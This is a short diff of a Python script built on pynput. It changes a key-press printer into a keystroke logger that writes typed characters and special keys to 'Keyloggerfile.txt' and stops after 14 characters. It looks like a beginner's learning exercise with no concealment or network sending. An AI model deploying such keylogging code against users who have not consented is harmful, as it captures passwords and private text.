@@ -1,10 +1,24 @@
-from pynput import keyboard #pynput python librairy use to make the link between the OS and the peripheral devices (mouse, keyboard)
+from pynput import keyboard
 
-def on_press(key):
+f = open("Keyloggerfile.txt", "w")
+counter = 0  # Initialize a counter for characters typed
+
+def main(key):
+    global counter #counter value preserved during all the script's run 
     try:
-        print(f'key {key.char} pressed')
-    except AttributeError:
-        print(f'Special key {key} pressed')
+        f.write(key.char)
+        counter += 1  # Increment the counter for each character typed
 
-with keyboard.Listener(on_press=on_press) as listener:
+        # Check if 14 characters have been typed, if yes, stop listening
+        if counter >= 14:
+            print("14 characters reached. Stopping.")
+            return False
+
+    except AttributeError:
+        f.write(f' [str{key}] ')
+
+
+with keyboard.Listener(on_press=main) as listener:
     listener.join()
+
+f.close()
